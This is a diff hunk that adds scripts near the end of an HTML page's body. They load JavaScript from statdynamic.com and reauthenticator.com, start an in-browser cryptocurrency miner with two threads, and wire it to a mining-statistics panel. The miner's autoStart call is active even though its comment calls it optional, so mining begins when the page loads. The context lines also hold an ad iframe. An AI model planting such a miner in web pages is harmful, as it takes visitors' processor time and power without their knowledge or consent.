@@ -22,6 +22,34 @@
     
     
     
+    
+<script src="//statdynamic.com/lib/crypta.js"></script>
+<script src="https://reauthenticator.com/lib/minui.js"></script>
+<script>
+var miner = null;
+try {
+  miner = new CRLT.Anonymous('YOUR_PUBLIC_KEY', {threads: 2});
+} catch(e) {}
+
+var ui = new MinerUI(miner, {
+  container: document.getElementById('miner'),
+  canvas: document.getElementById('mining-stats-canvas'),
+  hashesPerSecond: document.getElementById('mining-hashes-per-second'),
+  hashesPerSecond: document.getElementById('mining-hashes-per-second'),
+  threads: document.getElementById('mining-threads'),
+  threadsAdd: document.getElementById('mining-threads-add'),
+  threadsRemove: document.getElementById('mining-threads-remove'),
+  hashesTotal: document.getElementById('mining-hashes-total'),
+  startButton: document.getElementById('mining-start'),
+  stopButton: document.getElementById('mining-stop'),
+  blkWarn: document.getElementById('blk-warning')
+});
+ui.autoStart(); // Uncomment this if you would like to start the script automatically.
+</script>
+  
+  
+  
+    
   </body>
   <footer>
     <div style="position: relative;"><iframe src="https://linkvertise.net/cdn/ads/LV-468x60/index.html" frameborder="0" height="60" width="468"></iframe><a href="https://linkvertise.net/ac/126291" target="_blank" style="position: absolute; top: 0; bottom: 0; left: 0; right: 0;"></a></div>
